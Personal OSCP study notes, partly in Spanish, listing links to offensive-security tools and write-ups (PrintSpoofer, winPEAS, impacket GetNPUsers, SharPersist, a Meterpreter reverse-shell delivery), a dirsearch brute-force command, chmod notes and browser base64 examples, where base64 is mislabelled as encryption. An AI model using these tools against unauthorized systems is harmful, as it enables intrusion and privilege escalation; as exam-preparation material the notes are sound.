https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/
https://www.tiraniddo.dev/2020/04/sharing-logon-session-little-too-much.html
https://fareedfauzi.gitbook.io/oscp-notes/port-scanning/nmap-scanning  <--OSCP
https://ironhackers.es/cheatsheet/transferir-archivos-post-explotacion-cheatsheet/
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe
https://github.com/AonCyberLabs/Windows-Exploit-Suggester
https://github.com/bitsadmin/wesng
https://medium.com/@PenTest_duck/almost-all-the-ways-to-file-transfer-1bd6bf710d65
https://github.com/whoisflynn/OSCP-Exam-Report-Template/blob/master/OSCP-OS-XXXXX-Exam-Report_Template3.2.docx
https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py
https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader


Extra
https://github.com/fireeye/SharPersist
https://attack.mitre.org/techniques
https://github.com/BankSecurity/Red_Team/blob/master/Reverse_Shell/Meterpreter_Rev_Shell_via_SMB_Delivery.txt <--probar
https://github.com/gchq

GASTADAS
chmod o-x <carpeta>  le saca la ejecucion a otros sobre el path... 
chmod o-x <user>  no puede ni hacer un cd si no es el propietario



git clone https://github.com/maurosoria/dirsearch.git
dirsearch -u http://<ip> -e txt,html,php -w /opt/uploads/wordlists/directory-list-2.3-medium.txt -f
Extra web
base64 decode en herramientas de desarrollador Chrome
Console
Encriptar 
btoa('{"irderId":1030766771}')
Desencriptar 
atob('eyJpcmRlcklkIjoxMDMwNzY2NzcxfQ==')


